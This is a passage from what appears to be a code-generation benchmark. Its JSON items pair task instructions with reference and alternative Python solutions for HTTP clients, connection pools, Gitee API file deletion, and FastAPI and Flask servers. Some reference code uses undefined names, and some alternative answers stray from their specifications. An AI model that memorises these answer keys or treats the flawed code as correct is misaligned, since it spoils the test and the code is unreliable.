f\"http://{agentIP}:{agentPort}/api/v1/recordings/stop\"\n    status_code, response_text = makePostRequest(url, \"{}\")\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)\n\ndef updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart):\n    url = f\"http://{remoteIP}:{remotePort}/api/v1/config/update\"\n    payload = {\n        \"startupCfg\": startupCfg,\n        \"runningCfg\": runningCfg,\n        \"sendRestart\": sendRestart\n    }\n    status_code, response_text = makePostRequest(url, json.dumps(payload))\n    \n    if status_code == 200:\n        return (0, \"\")\n    else:\n        try:\n            data = json.loads(response_text)\n            return (status_code, data.get('error', 'Unknown error'))\n        except json.JSONDecodeError:\n            return (status_code, response_text)"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Create a Python class that retrieves and formats a daily motto from an external API using HTTP requests.\n\nClass Description: The `Motto` class provides functionality to fetch a daily motto from the open.iciba.com API and format it for display. It encapsulates the HTTP request logic and response handling.\n\nAttributes: None\n\nMethods:\n\nMethod1: main() -> str - A static method that performs the following operations:\n1. Sends a GET request to \"http://open.iciba.com/dsapi\"\n2. Checks if the response status code is 200 (success)\n3. Parses the JSON response\n4. Returns a formatted string containing the motto content and note\n5. Returns an empty string if the request fails\n\nThe method takes no input parameters and returns either:\n- A formatted string combining the \"content\" and \"note\" fields from the API response, separated by a newline\n- An empty string if the HTTP request fails (non-200 status code)",
    "Canonical_solution": "import requests\n\nclass Motto:\n    @staticmethod\n    def main():\n        response = requests.get(\"http://open.iciba.com/dsapi\")\n        if response.status_code != 200:\n            return \"\"\n        res = response.json()\n        return f'{res[\"content\"]}\\n{res[\"note\"]}\\n'",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\nclass Motto:\n    @staticmethod\n    def main() -> str:\n        url = \"http://open.iciba.com/dsapi\"\n        try:\n            response = requests.get(url)\n            if response.status_code == 200:\n                data = response.json()\n                content = data.get(\"content\", \"\")\n                note = data.get(\"note\", \"\")\n                return f\"{content}\\n{note}\"\n        except requests.RequestException:\n            pass\n        return \"\""
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a Python function that fetches stock data from Yahoo Finance API for a given stock symbol using HTTP requests.\n\nFunction Description: The function should make an HTTP GET request to Yahoo Finance's quote API endpoint, handle potential errors, and return the stock data in a string format. It should validate the response status and structure before returning the data.\n\nInput: \n- symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.)\n\nOutput: \n- str: A string representation of the stock data dictionary containing price, volume, and other relevant information from the API response\n\nRaises:\n- ValueError: If the HTTP request fails (non-200 status code) or if no data is found for the given symbol",
    "Canonical_solution": "import requests\n\ndef get_stock_data(symbol: str) -> str:\n    \"\"\"\n    Fetches stock data from Yahoo Finance for a given stock symbol.\n\n    Args:\n        symbol (str): The stock symbol to fetch data for (e.g., 'AAPL' for Apple Inc.).\n\n    Returns:\n        Dict[str, Any]: A dictionary containing stock data, including price, volume, and other relevant information.\n\n    Raises:\n        ValueError: If the stock symbol is invalid or data cannot be retrieved.\n    \"\"\"\n    url = f\"https://query1.finance.yahoo.com/v7/finance/quote?symbols={symbol}\"\n    response = requests.get(url)\n\n    if response.status_code != 200:\n        raise ValueError(f\"Error fetching data for symbol: {symbol}\")\n\n    data = response.json()\n    if (\n        \"quoteResponse\" not in data\n        or not data[\"quoteResponse\"][\"result\"]\n    ):\n        raise ValueError(f\"No data found for symbol: {symbol}\")\n\n    return str(data[\"quoteResponse\"][\"result\"][0])",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef get_stock_data(symbol):\n    url = f\"https://finance.yahoo.com/quote/{symbol}?p={symbol}&.tsrc=fin-srch\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"\n    }\n    \n    response = requests.get(url, headers=headers)\n    \n    if response.status_code != 200:\n        raise ValueError(f\"Failed to retrieve data for symbol {symbol}. HTTP status code: {response.status_code}\")\n    \n    from bs4 import BeautifulSoup\n    soup = BeautifulSoup(response.text, 'html.parser')\n    data_table = soup.find('div', {'data-test': 'quote-summary'})\n    \n    if not data_table:\n        raise ValueError(f\"No data found for symbol {symbol}\")\n    \n    stock_data = {}\n    for row in data_table.find_all('tr'):\n        key = row.find('td', {'class': 'C(blue)'}).text.strip() if row.find('td', {'class': 'C(blue)'}) else None\n        value = row.find('td', {'class': 'Ta(end)'}).text.strip() if row.find('td', {'class': 'Ta(end)'}) else None\n        if key and value:\n            stock_data[key] = value\n    \n    return str(stock_data)"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, with support for timeouts and retries.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that maintains a pool of reusable connections to a specified host and port. It handles connection lifecycle, including creation, retrieval, release, and cleanup, with support for connection timeouts and retry mechanisms.\n\nAttributes:\n- scheme: str - The URL scheme (default 'http')\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Default timeout configuration\n- retries: Retry - Default retry configuration\n- pool: queue.LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool or closes it if pool is full\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to open a URL using a connection from the pool",
    "Canonical_solution": "from socket import error as SocketError, timeout as SocketTimeout\nimport socket\nfrom .connection import HTTPConnection, HTTPSConnection, VerifiedHTTPSConnection\nfrom .response import HTTPResponse\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import get_host, Url\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n    ProtocolError,\n    HTTPException,\n    BaseSSLError,\n    CertificateError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nimport warnings\nimport logging\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host, port=None, strict=False,\n                 timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False,\n                 headers=None, retries=None,\n                 _proxy=None, _proxy_headers=None,\n                 **conn_kw):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n        for _ in six.moves.xrange(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise ReadTimeoutError(self, url, \"Read timed out.\")\n\n        return httplib_response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None,\n                redirect=True, assert_same_host=True, timeout=_Default,\n                pool_timeout=None, release_conn=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn, method, url, timeout=timeout_obj,\n                body=body, headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (TimeoutError, HTTPException, SocketError, ProtocolError,\n                BaseSSLError, SSLError, CertificateError) as e:\n            if conn:\n                conn.close()\n            raise MaxRetryError(self, url, e)\n\n        finally:\n            if release_conn:\n                self._put_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import queue\nimport socket\nfrom typing import Optional, Dict, Any, Type\nfrom http.client import HTTPConnection, HTTPResponse\nfrom urllib.parse import urlparse\nimport time\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 5.0\n\n    def __init__(self, total: float = None):\n        self.total = total if total is not None else self.DEFAULT_TIMEOUT\n\nclass Retry:\n    def __init__(self, total: int = 3, backoff_factor: float = 0.5):\n        self.total = total\n        self.backoff_factor = backoff_factor\n\nclass HTTPConnectionPool:\n    scheme = 'http'\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(self, host: str, port: Optional[int] = None, strict: bool = False, \n                 timeout: Timeout = Timeout(), maxsize: int = 1, block: bool = False, \n                 headers: Optional[Dict] = None, retries: Optional[Retry] = None, \n                 _proxy: Optional[str] = None, _proxy_headers: Optional[Dict] = None, **conn_kw):\n        self.host = host\n        self.port = port if port is not None else 80\n        self.timeout = timeout\n        self.retries = retries if retries is not None else Retry()\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.headers = headers or {}\n\n        for _ in range(maxsize):\n            try:\n                conn = self._new_conn()\n                self._put_conn(conn)\n            except Exception:\n                pass\n\n    def _new_conn(self) -> HTTPConnection:\n        return self.ConnectionCls(self.host, self.port, timeout=self.timeout.total, **self.conn_kw)\n\n    def _get_conn(self, timeout: Optional[float] = None) -> HTTPConnection:\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn.sock is None:\n                conn.connect()\n            return conn\n        except queue.Empty:\n            return self._new_conn()\n\n    def _put_conn(self, conn: HTTPConnection) -> None:\n        try:\n            self.pool.put(conn, block=self.block)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn: HTTPConnection, method: str, url: str, timeout: Any = Timeout.DEFAULT_TIMEOUT, **httplib_request_kw) -> HTTPResponse:\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(self, method: str, url: str, body: Optional[Any] = None, headers: Optional[Dict] = None, \n                retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, \n                timeout: Any = Timeout.DEFAULT_TIMEOUT, pool_timeout: Optional[float] = None, \n                release_conn: Optional[bool] = None, **response_kw) -> HTTPResponse:\n        retries = retries if retries is not None else self.retries\n        headers = {**self.headers, **(headers or {})}\n\n        for attempt in range(retries.total + 1):\n            conn = self._get_conn(pool_timeout)\n            try:\n                response = self._make_request(conn, method, url, body=body, headers=headers, timeout=timeout)\n                if release_conn is None or release_conn:\n                    self._put_conn(conn)\n                return response\n            except socket.timeout:\n                if attempt < retries.total:\n                    time.sleep(retries.backoff_factor * (attempt + 1))\n                    continue\n                raise\n            except Exception as e:\n                conn.close()\n                if attempt < retries.total:\n                    time.sleep(retries.backoff_factor * (attempt + 1))\n                    continue\n                raise e"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Implement a class to interact with the Gitee API for deleting files from a repository branch.\n\nClass Description: The FileOnlineDelete_gitee class provides functionality to delete files from a specified branch in a Gitee repository using the Gitee API v5. It handles authentication, file information retrieval, and deletion operations.\n\nAttributes:\n- url_prefix: str - Base URL for Gitee API v5 repository operations\n- show_help: str - Placeholder for help information (currently unused)\n\nMethods:\n- delete_file_from_branch(repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple - Deletes a file from the specified branch. Returns a success tuple or error message.\n  Parameters:\n    - repo_owner: str - Owner of the repository\n    - repo_name: str - Name of the repository\n    - file_path: str - Path to the file within the repository\n    - branch: str - Branch containing the file\n    - access_token: str - Gitee API access token\n    - commit_message: str - Commit message for the deletion (optional)\n  Returns:\n    - tuple: Either (\"Success\",) on success or (error_message,) on failure",
    "Canonical_solution": "import requests\n\nclass FileOnlineDelete_gitee:\n    def __init__(self):\n        self.url_prefix = \"https://gitee.com/api/v5/repos/\"\n        self.show_help = \"placeholder\"\n\n    def delete_file_from_branch(\n        self, repo_owner, repo_name, file_path, branch, access_token, commit_message=\"[comfyui_LLM_party] file deleted\"\n    ):\n        url = f\"https://gitee.com/api/v5/repos/{repo_owner}/{repo_name}/contents/{file_path}\"\n\n        params = {\"access_token\": access_token, \"ref\": branch}\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            print(f\"Failed to get file info. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return False\n\n        file_sha = response.json()[\"sha\"]\n\n        data = {\"access_token\": access_token, \"message\": commit_message, \"sha\": file_sha, \"branch\": branch}\n        response = requests.delete(url, json=data)\n\n        if response.status_code == 200:\n            print(f\"File '{file_path}' successfully deleted from branch '{branch}'.\")\n            return (\"Success\",)\n        else:\n            print(f\"Failed to delete file. Status code: {response.status_code}\")\n            print(f\"Response: {response.text}\")\n            return (response.text,)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\nclass FileOnlineDelete_gitee:\n    url_prefix = \"https://gitee.com/api/v5/repos\"\n    show_help = \"\"\n\n    def delete_file_from_branch(self, repo_owner: str, repo_name: str, file_path: str, branch: str, access_token: str, commit_message: str = \"[comfyui_LLM_party] file deleted\") -> tuple:\n        url = f\"{self.url_prefix}/{repo_owner}/{repo_name}/contents/{file_path}\"\n        params = {\n            \"access_token\": access_token,\n            \"branch\": branch,\n            \"message\": commit_message\n        }\n        \n        try:\n            response = requests.get(url, params=params)\n            if response.status_code != 200:\n                return (f\"Failed to get file info. Status code: {response.status_code}, Response: {response.text}\",)\n\n            file_info = response.json()\n            params[\"sha\"] = file_info['sha']\n\n            delete_response = requests.delete(url, params=params)\n            if delete_response.status_code == 200:\n                return (\"Success\",)\n            else:\n                return (f\"Failed to delete file. Status code: {delete_response.status_code}, Response: {delete_response.text}\",)\n        \n        except Exception as e:\n            return (f\"Exception occurred: {str(e)}\",)"
  },
  {
    "Task_id": 121,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server class that exposes various NLP pipeline functionalities including model information retrieval, tokenization, detokenization, and model inference.\n\nClass Description: The `ServeCommand` class encapsulates a FastAPI application that serves an NLP pipeline through RESTful endpoints. It provides methods for getting model information, tokenizing text, detokenizing tokens, and performing model inference.\n\nAttributes:\n- _pipeline: [Any] - The NLP pipeline object containing the model and tokenizer\n- host: [str] - The host address where the server will run (default: \"localhost\")\n- port: [int] - The port number for the server (default: 8888)\n- workers: [int] - Number of worker processes (default: 1)\n- _app: [FastAPI] - The FastAPI application instance\n\nMethods:\n- __init__(pipeline, host: str = \"localhost\", port: int = 8888, workers: int = 1) -> None - Initializes the server with the NLP pipeline and server configuration\n- run() -> None - Starts the FastAPI server using uvicorn\n- model_info() -> ServeModelInfoResult - Returns model configuration information\n- tokenize(text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)) -> ServeTokenizeResult - Tokenizes input text and optionally returns token IDs\n- detokenize(tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)) -> ServeDeTokenizeResult - Converts token IDs back to text\n- forward(inputs=Body(None, embed=True)) -> ServeForwardResult - Performs model inference on the given inputs",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException\nfrom fastapi.routing import APIRoute\nfrom pydantic import BaseModel\nfrom starlette.responses import JSONResponse\nfrom uvicorn import run\nfrom typing import List, Any, Optional\n\nclass ServeModelInfoResult(BaseModel):\n    infos: dict\n\nclass ServeTokenizeResult(BaseModel):\n    tokens: List[str]\n    tokens_ids: Optional[List[int]]\n\nclass ServeDeTokenizeResult(BaseModel):\n    text: str\n\nclass ServeForwardResult(BaseModel):\n    output: Any\n\nclass ServeCommand:\n    def __init__(self, pipeline, host: str = \"localhost\", port: int = 8888, workers: int = 1):\n        self._pipeline = pipeline\n        self.host = host\n        self.port = port\n        self.workers = workers\n\n        self._app = FastAPI(\n            routes=[\n                APIRoute(\"/\", self.model_info, response_model=ServeModelInfoResult, response_class=JSONResponse, methods=[\"GET\"]),\n                APIRoute(\"/tokenize\", self.tokenize, response_model=ServeTokenizeResult, response_class=JSONResponse, methods=[\"POST\"]),\n                APIRoute(\"/detokenize\", self.detokenize, response_model=ServeDeTokenizeResult, response_class=JSONResponse, methods=[\"POST\"]),\n                APIRoute(\"/forward\", self.forward, response_model=ServeForwardResult, response_class=JSONResponse, methods=[\"POST\"]),\n            ],\n            timeout=600,\n        )\n\n    def run(self):\n        run(self._app, host=self.host, port=self.port, workers=self.workers)\n\n    def model_info(self):\n        return ServeModelInfoResult(infos=vars(self._pipeline.model.config))\n\n    def tokenize(self, text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)):\n        try:\n            tokens_txt = self._pipeline.tokenizer.tokenize(text_input)\n            if return_ids:\n                tokens_ids = self._pipeline.tokenizer.convert_tokens_to_ids(tokens_txt)\n                return ServeTokenizeResult(tokens=tokens_txt, tokens_ids=tokens_ids)\n            else:\n                return ServeTokenizeResult(tokens=tokens_txt)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})\n\n    def detokenize(self, tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)):\n        try:\n            decoded_str = self._pipeline.tokenizer.decode(tokens_ids, skip_special_tokens, cleanup_tokenization_spaces)\n            return ServeDeTokenizeResult(text=decoded_str)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})\n\n    async def forward(self, inputs=Body(None, embed=True)):\n        if len(inputs) == 0:\n            return ServeForwardResult(output=[])\n        try:\n            output = self._pipeline(inputs)\n            return ServeForwardResult(output=output)\n        except Exception as e:\n            raise HTTPException(status_code=500, detail={\"error\": str(e)})",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "right_result": "from fastapi import FastAPI, Body\nfrom typing import Any, List, Dict, Optional\nfrom pydantic import BaseModel\nimport uvicorn\n\nclass ServeModelInfoResult(BaseModel):\n    model_config: Dict[str, Any]\n\nclass ServeTokenizeResult(BaseModel):\n    tokens: List[str]\n    token_ids: Optional[List[int]] = None\n\nclass ServeDeTokenizeResult(BaseModel):\n    text: str\n\nclass ServeForwardResult(BaseModel):\n    outputs: Any\n\nclass ServeCommand:\n    def __init__(self, pipeline: Any, host: str = \"localhost\", port: int = 8888, workers: int = 1):\n        self._pipeline = pipeline\n        self.host = host\n        self.port = port\n        self.workers = workers\n        self._app = FastAPI()\n\n        @self._app.get(\"/model_info\", response_model=ServeModelInfoResult)\n        async def model_info():\n            return self.model_info()\n\n        @self._app.post(\"/tokenize\", response_model=ServeTokenizeResult)\n        async def tokenize(text_input: str = Body(None, embed=True), return_ids: bool = Body(False, embed=True)):\n            return self.tokenize(text_input, return_ids)\n\n        @self._app.post(\"/detokenize\", response_model=ServeDeTokenizeResult)\n        async def detokenize(tokens_ids: List[int] = Body(None, embed=True), skip_special_tokens: bool = Body(False, embed=True), cleanup_tokenization_spaces: bool = Body(True, embed=True)):\n            return self.detokenize(tokens_ids, skip_special_tokens, cleanup_tokenization_spaces)\n\n        @self._app.post(\"/forward\", response_model=ServeForwardResult)\n        async def forward(inputs=Body(None, embed=True)):\n            return self.forward(inputs)\n\n    def run(self):\n        uvicorn.run(\n            self._app,\n            host=self.host,\n            port=self.port,\n            workers=self.workers\n        )\n\n    def model_info(self) -> ServeModelInfoResult:\n        config = self._pipeline.model.config.to_dict()\n        return ServeModelInfoResult(model_config=config)\n\n    def tokenize(self, text_input: str, return_ids: bool = False) -> ServeTokenizeResult:\n        tokens = self._pipeline.tokenizer.tokenize(text_input)\n        token_ids = self._pipeline.tokenizer.convert_tokens_to_ids(tokens) if return_ids else None\n        return ServeTokenizeResult(tokens=tokens, token_ids=token_ids)\n\n    def detokenize(self, tokens_ids: List[int], skip_special_tokens: bool = False, cleanup_tokenization_spaces: bool = True) -> ServeDeTokenizeResult:\n        text = self._pipeline.tokenizer.decode(\n            tokens_ids,\n            skip_special_tokens=skip_special_tokens,\n            cleanup_tokenization_spaces=cleanup_tokenization_spaces\n        )\n        return ServeDeTokenizeResult(text=text)\n\n    def forward(self, inputs) -> ServeForwardResult:\n        outputs = self._pipeline.model(**inputs)\n        return ServeForwardResult(outputs=outputs)"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a FastAPI-based action server that can execute predefined actions and list available actions through HTTP endpoints.\n\nClass Description: The ActionServer class initializes a FastAPI application with endpoints for running actions and listing available actions. It uses an action dispatcher to handle the execution of actions.\n\nAttributes:\n- _app: FastAPI - The FastAPI application instance that handles HTTP requests.\n- _action_dispatcher: Any - The dispatcher responsible for executing actions and providing the list of registered actions.\n\nMethods:\n- __init__(action_dispatcher: Any) -> None - Initializes the ActionServer with the given action dispatcher and sets up the FastAPI routes.\n- run_action(body: RequestBody) -> Dict[str, str] - Executes the specified action with the given parameters and returns the result and status.\n- get_actions_list() -> Any - Returns the list of available actions from the action dispatcher.\n- get_app() -> FastAPI - Returns the FastAPI application instance for external use.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom typing import Dict, Optional\n\nclass RequestBody(BaseModel):\n    action_name: str = \"\"\n    action_parameters: Dict = Field(\n        default={}, description=\"The list of action parameters.\"\n    )\n\nclass ResponseBody(BaseModel):\n    status: str = \"success\"\n    result: Optional[str]\n\nclass ActionServer:\n    def __init__(self, action_dispatcher):\n        self._app = FastAPI(\n            title=\"Guardrails Action Server API\",\n            description=\"Guardrails Action Sever API.\",\n            version=\"0.1.0\",\n            license_info={\"name\": \"Apache License, Version 2.0\"},\n        )\n        self._action_dispatcher = action_dispatcher\n\n        self._app.post(\n            \"/v1/actions/run\",\n            summary=\"Execute action\",\n            response_model=ResponseBody,\n        )(self.run_action)\n        self._app.get(\n            \"/v1/actions/list\",\n            summary=\"List available actions\",\n        )(self.get_actions_list)\n\n    async def run_action(self, body: RequestBody):\n        result, status = await self._action_dispatcher.execute_action(\n            body.action_name, body.action_parameters\n        )\n        return {\"status\": status, \"result\": result}\n\n    async def get_actions_list(self):\n        return self._action_dispatcher.get_registered_actions()\n\n    def get_app(self):\n        return self._app",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "right_result": "from fastapi import FastAPI, HTTPException\nfrom typing import Any, Dict\nfrom pydantic import BaseModel\n\nclass RequestBody(BaseModel):\n    action_name: str\n    parameters: Dict[str, str]\n\nclass ActionServer:\n    def __init__(self, action_dispatcher: Any) -> None:\n        self._app = FastAPI()\n        self._action_dispatcher = action_dispatcher\n\n        @self._app.post(\"/run_action\")\n        async def run_action(body: RequestBody) -> Dict[str, str]:\n            try:\n                result = self._action_dispatcher.execute_action(body.action_name, body.parameters)\n                return {\"result\": result, \"status\": \"success\"}\n            except Exception as e:\n                raise HTTPException(status_code=500, detail=str(e))\n\n        @self._app.get(\"/actions\")\n        async def get_actions_list() -> Any:\n            return self._action_dispatcher.get_registered_actions()\n\n    def get_app(self) -> FastAPI:\n        return self._app"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles incoming POST requests with different content types (JSON, CSV, plain text) and returns predictions from a scoring service in the appropriate format.\n\nFunction Description: The `transformation` function is a Flask route handler for \"/invocations\" endpoint that processes incoming POST requests. It checks the content type of the request, extracts and processes the data accordingly, gets predictions from a scoring service, and returns the results in the corresponding format (JSON for JSON input, CSV for CSV/text input).\n\nInput: \n- The function receives HTTP POST requests through Flask's request object\n- Supported input content types:\n  * application/json: {\"text\": string, \"bing_key\": optional string}\n  * text/csv: CSV file with a \"text\" column\n  * text/plain: Plain text file with one text per line\n\nOutput:\n- For successful processing:\n  * JSON response (for JSON input) containing top 10 predictions\n  * CSV response (for CSV/text input) containing predictions\n- For unsupported content types: 415 error response with plain text message\n\nThe function returns Flask Response objects with:\n- response: The processed data in appropriate format\n- status: HTTP status code (200 for success, 415 for unsupported type)\n- mimetype: Corresponding to the response format",
    "Canonical_solution": "import os\nimport json\nimport flask\nimport pandas as pd\nimport io\nfrom collections import OrderedDict\n\nprefix = \"/opt/ml/\"\nPATH = os.path.join(prefix, \"model\")\n\napp = flask.Flask(__name__)\n\n@app.route(\"/invocations\", methods=[\"POST\"])\ndef transformation():\n    data = None\n    text = None\n\n    if flask.request.content_type == \"application/json\":\n        data = flask.request.get_json(silent=True)\n        text = data[\"text\"]\n        try:\n            bing_key = data[\"bing_key\"]\n        except Exception:\n            bing_key = None\n\n        predictions = ScoringService.predict(text, bing_key)\n        result = json.dumps(predictions[:10])\n        return flask.Response(response=result, status=200, mimetype=\"application/json\")\n\n    elif flask.request.content_type == \"text/csv\":\n        data = flask.request.data.decode(\"utf-8\")\n        df = pd.read_csv(io.StringIO(data), header=\"infer\")\n        predictions = ScoringService.predict_batch(list(df[\"text\"].values))\n\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    elif flask.request.content_type == \"text/plain\":\n        data = flask.request.data.decode(\"utf-8\")\n        s = io.StringIO(data)\n        texts = []\n        for line in s:\n            texts.append(line)\n        predictions = ScoringService.predict_batch(texts)\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    else:\n        return flask.Response(\n            response=\"This predictor only supports JSON, txt or CSV data\",\n            status=415,\n            mimetype=\"text/plain\",\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport json\nimport csv\nimport io\n\napp = Flask(__name__)\n\n# Mock scoring service function\ndef score_data(data):\n    predictions = []\n    for item in data:\n        prediction = {\n            \"text\": item,\n            \"predictions\": [{\"label\": \"example_label\", \"score\": 0.95} for _ in range(10)]\n        }\n        predictions.append(prediction)\n    return predictions\n\n@app.route('/invocations', methods=['POST'])\ndef transformation():\n    content_type = request.headers.get('Content-Type')\n    \n    if content_type == 'application/json':\n        data = request.get_json()\n        text_data = [data['text']]\n        \n    elif content_type == 'text/csv':\n        csv_file = request.files.get('file')\n        if not csv_file:\n            return Response(\"No CSV file provided\", status=400, mimetype='text/plain')\n        csv_reader = csv.DictReader(io.StringIO(csv_file.read().decode('utf-8')))\n        text_data = [row['text'] for row in csv_reader]\n        \n    elif content_type == 'text/plain':\n        text_data = request.get_data(as_text=True).splitlines()\n        \n    else:\n        return Response(\"Unsupported Content-Type\", status=415, mimetype='text/plain')\n\n    predictions = score_data(text_data)\n\n    if content_type == 'application/json':\n        response_data = {\"predictions\": predictions[0][\"predictions\"]}\n        return Response(json.dumps(response_data), status=200, mimetype='application/json')\n    \n    else:\n        output = io.StringIO()\n        fieldnames = ['text', 'label', 'score']\n        writer = csv.DictWriter(output, fieldnames=fieldnames)\n        writer.writeheader()\n        \n        for prediction in predictions:\n            for pred in prediction['predictions']:\n                writer.writerow({\n                    'text': prediction['text'],\n                    'label': pred['label'],\n                    'score': pred['score']\n                })\n        \n        return Response(output.getvalue(), status=200, mimetype='text/csv')"
  },
  {
    "Task_id": 128,
